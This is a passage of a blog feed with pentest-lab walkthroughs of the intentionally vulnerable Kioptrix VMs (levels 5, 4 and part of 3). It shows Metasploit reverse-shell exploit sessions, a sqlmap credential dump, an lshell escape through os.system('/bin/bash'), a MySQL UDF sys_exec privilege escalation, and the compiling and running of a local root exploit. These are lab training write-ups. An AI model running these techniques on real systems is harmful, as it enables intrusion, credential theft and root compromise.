</span><span class='line'>msf exploit(phptax_exec) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>msf exploit(phptax_exec) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse double handler
</span><span class='line'>[*] 192.168.127.1308080 - Sending request...
</span><span class='line'>[*] Accepted the first client connection...
</span><span class='line'>[*] Accepted the second client connection...
</span><span class='line'>[*] Command: echo ROZVUxzhMsI70Nsb;
</span><span class='line'>[*] Writing to socket A
</span><span class='line'>[*] Writing to socket B
</span><span class='line'>[*] Reading from sockets...
</span><span class='line'>[*] Reading from socket B
</span><span class='line'>[*] B: "ROZVUxzhMsI70Nsb\r\n"
</span><span class='line'>[*] Matching...
</span><span class='line'>[*] A is input...
</span><span class='line'>[*] Accepted the first client connection...
</span><span class='line'>[*] Accepted the second client connection...
</span><span class='line'>[*] Command: echo D6E80V1rZ169oQA6;
</span><span class='line'>[*] Writing to socket A
</span><span class='line'>[*] Writing to socket B
</span><span class='line'>[*] Reading from sockets...
</span><span class='line'>[*] Reading from socket A
</span><span class='line'>[*] A: "D6E80V1rZ169oQA6\r\n"
</span><span class='line'>[*] Matching...
</span><span class='line'>[*] B is input...
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>www</span></code></pre></td></tr></table></div></figure>


<p>We managed to break through. Now let&rsquo;s see how we can become root. I used <a href="http://www.exploit-db.com/exploits/26368/">this mmap/ptrace exploit</a></p>

<p>I downloaded it to my machine and served it on netcat, than I connected from the victim to the attacker machine and saved the file to the /tmp directory. From there, it was a matter of compiling it and running it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gcc -o exploit 26368.c
</span><span class='line'>chmod a+x exploit
</span><span class='line'>./exploit
</span><span class='line'>whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>In the /root directory, there&rsquo;s another congrats.txt from loneferret:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat congrats.txt
</span><span class='line'>If you are reading this, it means you got root (or cheated).
</span><span class='line'>Congratulations either way...
</span><span class='line'>
</span><span class='line'>Hope you enjoyed this new VM of mine. As always, they are made for the beginner in 
</span><span class='line'>mind, and not meant for the seasoned pentester. However this does not mean one 
</span><span class='line'>can't enjoy them.
</span><span class='line'>
</span><span class='line'>As with all my VMs, besides getting "root" on the system, the goal is to also
</span><span class='line'>learn the basics skills needed to compromise a system. Most importantly, in my mind,
</span><span class='line'>are information gathering & research. Anyone can throw massive amounts of exploits
</span><span class='line'>and "hope" it works, but think about the traffic.. the logs... Best to take it
</span><span class='line'>slow, and read up on the information you gathered and hopefully craft better
</span><span class='line'>more targetted attacks. 
</span><span class='line'>
</span><span class='line'>For example, this system is FreeBSD 9. Hopefully you noticed this rather quickly.
</span><span class='line'>Knowing the OS gives you any idea of what will work and what won't from the get go.
</span><span class='line'>Default file locations are not the same on FreeBSD versus a Linux based distribution.
</span><span class='line'>Apache logs aren't in "/var/log/apache/access.log", but in "/var/log/httpd-access.log".
</span><span class='line'>It's default document root is not "/var/www/" but in "/usr/local/www/apache22/data".
</span><span class='line'>Finding and knowing these little details will greatly help during an attack. Of course
</span><span class='line'>my examples are specific for this target, but the theory applies to all systems.
</span><span class='line'>
</span><span class='line'>As a small exercise, look at the logs and see how much noise you generated. Of course
</span><span class='line'>the log results may not be accurate if you created a snapshot and reverted, but at least
</span><span class='line'>it will give you an idea. For fun, I installed "OSSEC-HIDS" and monitored a few things.
</span><span class='line'>Default settings, nothing fancy but it should've logged a few of your attacks. Look
</span><span class='line'>at the following files:
</span><span class='line'>/root/folderMonitor.log
</span><span class='line'>/root/httpd-access.log (softlink)
</span><span class='line'>/root/ossec-alerts.log (softlink)
</span><span class='line'>
</span><span class='line'>The folderMonitor.log file is just a cheap script of mine to track created/deleted and modified
</span><span class='line'>files in 2 specific folders. Since FreeBSD doesn't support "iNotify", I couldn't use OSSEC-HIDS 
</span><span class='line'>for this.
</span><span class='line'>The httpd-access.log is rather self-explanatory .
</span><span class='line'>Lastly, the ossec-alerts.log file is OSSEC-HIDS is where it puts alerts when monitoring certain
</span><span class='line'>files. This one should've detected a few of your web attacks.
</span><span class='line'>
</span><span class='line'>Feel free to explore the system and other log files to see how noisy, or silent, you were.
</span><span class='line'>And again, thank you for taking the time to download and play.
</span><span class='line'>Sincerely hope you enjoyed yourself.
</span><span class='line'>
</span><span class='line'>Be good...
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>loneferret
</span><span class='line'>http://www.kioptrix.com
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>p.s.: Keep in mind, for each "web attack" detected by OSSEC-HIDS, by
</span><span class='line'>default it would've blocked your IP (both in hosts.allow & Firewall) for
</span><span class='line'>600 seconds. I was nice enough to remove that part :)</span></code></pre></td></tr></table></div></figure>


<p>This concludes the Kioptrix series, and cheers to <strong>loneferret</strong> for creating these awesome challenges!</p>

<blockquote><p>Today is the first day of the rest of the mess.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 4]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/22/pentest-lab-kioptrix-level-4/"/>
    <updated>2014-06-22T22:39:14+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/22/pentest-lab-kioptrix-level-4</id>
    <content type="html"><![CDATA[<p>This is the final vulnerable machine in the Kioptrix series. To set it up in VMware, create a new virtual machine with the advanced options and use existing virtual disk, pointing it at the Kioptrix 4 virtual disk.</p>

<!-- more -->


<p>Let&rsquo;s see what Nmap reveals:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -A -p1-65535 192.168.127.129
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 ( http://nmap.org ) at 2014-06-22 22:35 EEST
</span><span class='line'>Nmap scan report for 192.168.127.129
</span><span class='line'>Host is up (0.00074s latency).
</span><span class='line'>Not shown: 39528 closed ports, 26003 filtered ports
</span><span class='line'>PORT    STATE SERVICE     VERSION
</span><span class='line'>22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
</span><span class='line'>|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
</span><span class='line'>80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
</span><span class='line'>|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
</span><span class='line'>|_http-title: Site doesn't have a title (text/html).
</span><span class='line'>139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
</span><span class='line'>445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
</span><span class='line'>MAC Address: 00:0C:29:1F:12:65 (VMware)
</span><span class='line'>Device type: general purpose
</span><span class='line'>Running: Linux 2.6.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6
</span><span class='line'>OS details: Linux 2.6.9 - 2.6.33
</span><span class='line'>Network Distance: 1 hop
</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span><span class='line'>
</span><span class='line'>Host script results:
</span><span class='line'>|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
</span><span class='line'>| smb-os-discovery: 
</span><span class='line'>|   OS: Unix (Samba 3.0.28a)
</span><span class='line'>|   Computer name: Kioptrix4
</span><span class='line'>|   NetBIOS computer name: 
</span><span class='line'>|   Domain name: localdomain
</span><span class='line'>|   FQDN: Kioptrix4.localdomain
</span><span class='line'>|_  System time: 2014-06-22T18:36:57-04:00
</span><span class='line'>| smb-security-mode: 
</span><span class='line'>|   Account that was used for smb scripts: guest
</span><span class='line'>|   User-level authentication
</span><span class='line'>|   SMB Security: Challenge/response passwords supported
</span><span class='line'>|_  Message signing disabled (dangerous, but default)
</span><span class='line'>|_smbv2-enabled: Server doesn't support SMBv2 protocol</span></code></pre></td></tr></table></div></figure>


<p>Again, this seems to be a web based challenge. Navigating to the target website shows this:</p>

<p><img class="center" src="http://chousensha.github.io/images/kio4.png" title="login" alt="login"></p>

<p>Supplying a single quote in the password field gives an error, which nicely discloses the database end as being MySQL:</p>

<p><em>Warning: mysql_num_rows(): supplied argument is not a valid MySQL result resource in /var/www/checklogin.php on line 28
Wrong Username or Password</em></p>

<p>Sqlmap to the rescue!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.127.129/checklogin.php" --dbms=MySQL --level=5 --risk=3 --data="myusername=admin&mypassword=test" --dump
</span><span class='line'>
</span><span class='line'>Database: members
</span><span class='line'>Table: members
</span><span class='line'>[2 entries]
</span><span class='line'>+----+----------+-----------------------+
</span><span class='line'>| id | username | password              |
</span><span class='line'>+----+----------+-----------------------+
</span><span class='line'>| 1  | john     | MyNameIsJohn          |
</span><span class='line'>| 2  | robert   | ADGAdsafdfwt4gadfga== |
</span><span class='line'>+----+----------+-----------------------+</span></code></pre></td></tr></table></div></figure>


<p>Logging in with these credentials didn&rsquo;t yield anything though, all I could see was a member&rsquo;s control panel with no functionality. So I remembered the previous challenge that allowed SSH access, and tried to log in:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ssh john@192.168.127.129
</span><span class='line'>The authenticity of host '192.168.127.129 (192.168.127.129)' can't be established.
</span><span class='line'>RSA key fingerprint is 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
</span><span class='line'>Warning: Permanently added '192.168.127.129' (RSA) to the list of known hosts.
</span><span class='line'>john@192.168.127.129's password: 
</span><span class='line'>Welcome to LigGoat Security Systems - We are Watching
</span><span class='line'>== Welcome LigGoat Employee ==
</span><span class='line'>LigGoat Shell is in place so you  don't screw up
</span><span class='line'>Type '?' or 'help' to get the list of allowed commands
</span><span class='line'>john:~$ </span></code></pre></td></tr></table></div></figure>


<p>Excellent! It&rsquo;s time for some sniffing around. This is not a normal shell, usual commands don&rsquo;t work, so let&rsquo;s see what&rsquo;s available with the help system.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>john:~$ help
</span><span class='line'>cd  clear  echo  exit  help  ll  lpath  ls</span></code></pre></td></tr></table></div></figure>


<p>Hmm, not much. Actions are restricted too, can&rsquo;t <em>cd</em> to wherever I want:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>john:~$ cd /
</span><span class='line'>*** forbidden path -&gt; "/"
</span><span class='line'>*** You have 0 warning(s) left, before getting kicked out.
</span><span class='line'>This incident has been reported.</span></code></pre></td></tr></table></div></figure>


<p>So I googled for a bit, and it appears this shell is a Python based limited shell (<a href="https://github.com/ghantoos/lshell">https://github.com/ghantoos/lshell</a>):</p>

<blockquote><p>lshell is a shell coded in Python, that lets you restrict a user&rsquo;s environment to limited sets of commands, choose to enable/
disable any command over SSH (e.g. SCP, SFTP, rsync, etc.), log user&rsquo;s commands, implement timing restriction, and more.</p></blockquote>

<p>It is possible to escape from this shell by leveraging the <em>echo</em> command to call <em>os.system</em> in order to spawn a shell: <code>echo os.system(&lsquo;/bin/bash&rsquo;)</code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>john:~$ echo os.system('/bin/bash')
</span><span class='line'>john@Kioptrix4:~$ id
</span><span class='line'>uid=1001(john) gid=1001(john) groups=1001(john)</span></code></pre></td></tr></table></div></figure>


<p>Poking around, I found the following information in <code>/var/www/john/john.php</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$host="localhost"; // Host name
</span><span class='line'>$username="root"; // Mysql username
</span><span class='line'>$password=""; // Mysql password</span></code></pre></td></tr></table></div></figure>


<p>So, root doesn&rsquo;t have a password for MySQL? Let&rsquo;s check:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>john@Kioptrix4:/var/www/john$ mysql -u root -h localhost 
</span><span class='line'>Welcome to the MySQL monitor.  Commands end with ; or \g.
</span><span class='line'>Your MySQL connection id is 8
</span><span class='line'>Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)
</span><span class='line'>
</span><span class='line'>Type 'help;' or '\h' for help. Type '\c' to clear the buffer.</span></code></pre></td></tr></table></div></figure>


<p><a href="http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-windows-and-linux/">Here</a> I have found a way to get root privileges from a MySQL server running as root. Here&rsquo;s a quick summary:</p>

<ul>
<li><p>It is possible to escalate from MySQL server root level to system root by using User Defined Functions (UDF)</p></li>
<li><p>We need the <a href="https://github.com/mysqludf/lib_mysqludf_sys">lib_mysqludf_sys.so</a> library that contains some useful functions that can interact with the OS. The most important ones are <strong>sys_exec</strong> (executes the command and returns the exit status) and <strong>sys_eval</strong> (executes the command and returns the standard output)</p></li>
</ul>


<p>The next step would be to find a way to get the library on the machine with our MySQL server. But that&rsquo;s not necessary in this case, because it&rsquo;s already on the server!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>john@Kioptrix4:~$ whereis lib_mysqludf_sys.so
</span><span class='line'>lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so</span></code></pre></td></tr></table></div></figure>


<p>It took a bit of googling and trial and error until I found a way that worked in getting me to a root shell. <a href="http://superuser.com/questions/400723/how-do-i-create-a-superuser-from-the-command-line-in-ubuntu">Here</a> is a useful post. The relevant part for us is this:</p>

<blockquote><p>Until Ubuntu 11.10, the Unix group for administrators with root privileges through sudo had been admin. Starting with Ubuntu
12.04  LTS, it is now sudo, for compatibility with Debian and sudo itself. However, for backwards compatibility, admin group
members are still recognized as administrators</p></blockquote>

<p>So it is possible to make the john account to be part of the admin group, that is equivalent to the sudo group. So from the MySQL prompt, run this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span> <span class="n">sys_exec</span><span class="p">(</span><span class="s1">&#39;usermod -a -G admin&#39;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>What that does is it modifies john&rsquo;s account, appending it to the admin group. So let&rsquo;s do it on the MySQL command line:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="n">sys_exec</span><span class="p">(</span><span class="s1">&#39;usermod -a -G admin john&#39;</span><span class="p">);</span>
</span><span class='line'><span class="o">+</span><span class="c1">--------------------------------------+</span>
</span><span class='line'><span class="o">|</span> <span class="n">sys_exec</span><span class="p">(</span><span class="s1">&#39;usermod -a -G admin john&#39;</span><span class="p">)</span> <span class="o">|</span>
</span><span class='line'><span class="o">+</span><span class="c1">--------------------------------------+</span>
</span><span class='line'><span class="o">|</span> <span class="k">NULL</span>                                 <span class="o">|</span>
</span><span class='line'><span class="o">+</span><span class="c1">--------------------------------------+</span>
</span><span class='line'><span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">11</span> <span class="n">sec</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now from john&rsquo;s shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>john@Kioptrix4:~$ sudo su
</span><span class='line'>[sudo] password for john: 
</span><span class='line'>root@Kioptrix4:/home/john# whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>Awesome! We finally got root access! In root&rsquo;s directory there is another </code>congrats.txt</code> file that tells us there are at least 2 different tested ways to get root on this system. It sure was an interesting machine, and my favorite in the series, because it wasn&rsquo;t as straightforward as the others, and I had to look for more information and try (and fail) different approaches before I hit upon the winning one.</p>

<p>Here&rsquo;s today&rsquo;s fortune cookie:</p>

<blockquote><p>You single-handedly fought your way into this hopeless mess.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 3]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/20/pentest-lab-kioptrix-level-3/"/>
    <updated>2014-06-20T23:53:34+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/20/pentest-lab-kioptrix-level-3</id>
    <content type="html"><![CDATA[<p>Next in the Kioptrix series is level 3.</p>

<p><strong>Important</strong></p>

<p>With the VM there is a README.txt file that says you should update your hosts file with the VM&rsquo;s IP and hostname, which is <em>kioptrix3.com</em>. I initially ignored it and on the gallery page, all I could see were some broken images and links that didn&rsquo;t work. I went back and added the entry to my <code>/etc/hosts</code> file, and everything worked fine afterwards.</p>

<!-- more -->


<p>Start by checking out what&rsquo;s being exposed with Nmap:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -A -p1-65535 192.168.127.128
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 ( http://nmap.org ) at 2014-06-20 23:56 EEST
</span><span class='line'>Nmap scan report for 192.168.127.128
</span><span class='line'>Host is up (0.00039s latency).
</span><span class='line'>Not shown: 65533 closed ports
</span><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
</span><span class='line'>|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
</span><span class='line'>80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
</span><span class='line'>|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
</span><span class='line'>|_http-title: Ligoat Security - Got Goat? Security ...
</span><span class='line'>MAC Address: 00:0C:29:07:4F:A9 (VMware)
</span><span class='line'>Device type: general purpose
</span><span class='line'>Running: Linux 2.6.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6
</span><span class='line'>OS details: Linux 2.6.9 - 2.6.33
</span><span class='line'>Network Distance: 1 hop
</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s take a look at what&rsquo;s hosted on the web server. It appears to be a site with a blog page, a gallery and what appears to be an admin login page:</p>

<p><img class="center" src="http://chousensha.github.io/images/lotus_cms.png" title="admin login" alt="login"></p>

<p>I tried running a sqlmap scan against it, with no success. Next, I thought maybe there might be something about the LotusCMS that powers up the site. It turns out there&rsquo;s a remote execution exploit available in Metasploit:</p>

<p><strong>LotusCMS 3.0 eval() Remote Command Execution</strong></p>

<blockquote><p>This module exploits a vulnerability found in Lotus CMS 3.0&rsquo;s Router() function. This is done by embedding PHP code in the &lsquo;page&rsquo; parameter,
which will be passed to a eval call, therefore allowing remote code execution. The module can either automatically pick up a &lsquo;page&rsquo; parameter
from the default page, or manually specify one in the URI option. To use the automatic method, please supply the URI with just a directory path,
for example: &ldquo;/lcms/&rdquo;. To manually configure one, you may do: &ldquo;/lcms/somepath/index.php?page=index&rdquo;</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/http/lcms_php_exec
</span><span class='line'>msf exploit(lcms_php_exec) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/http/lcms_php_exec):
</span><span class='line'>
</span><span class='line'>   Name     Current Setting  Required  Description
</span><span class='line'>   ----     ---------------  --------  -----------
</span><span class='line'>   Proxies                   no        Use a proxy chain
</span><span class='line'>   RHOST                     yes       The target address
</span><span class='line'>   RPORT    80               yes       The target port
</span><span class='line'>   URI      /lcms/           yes       URI
</span><span class='line'>   VHOST                     no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic LotusCMS 3.0
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(lcms_php_exec) &gt; set RHOST 192.168.127.128
</span><span class='line'>RHOST =&gt; 192.168.127.128
</span><span class='line'>msf exploit(lcms_php_exec) &gt; set payload generic/shell_reverse_tcp
</span><span class='line'>payload =&gt; generic/shell_reverse_tcp
</span><span class='line'>msf exploit(lcms_php_exec) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>msf exploit(lcms_php_exec) &gt; set URI /
</span><span class='line'>URI =&gt; /
</span><span class='line'>msf exploit(lcms_php_exec) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on 192.168.127.159:4444 
</span><span class='line'>[*] Using found page param: /index.php?page=index
</span><span class='line'>[*] Sending exploit ...
</span><span class='line'>[*] Command shell session 1 opened (192.168.127.159:4444 -&gt; 192.168.127.128:40623) at 2014-06-22 00:37:23 +0300
</span><span class='line'>whoami
</span><span class='line'>
</span><span class='line'>www-data</span></code></pre></td></tr></table></div></figure>


<p>So we have a shell. I could not find a local privilege escalation exploit right away, so I instead started exploring the system.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pwd
</span><span class='line'>/home/www/kioptrix3.com
</span><span class='line'>ls -l
</span><span class='line'>total 84
</span><span class='line'>drwxrwxrwx  2 root root  4096 Apr 15  2011 cache
</span><span class='line'>drwxrwxrwx  8 root root  4096 Apr 14  2011 core
</span><span class='line'>drwxrwxrwx  8 root root  4096 Apr 14  2011 data
</span><span class='line'>-rw-r--r--  1 root root 23126 Jun  5  2009 favicon.ico
</span><span class='line'>drwxr-xr-x  7 root root  4096 Apr 14  2011 gallery
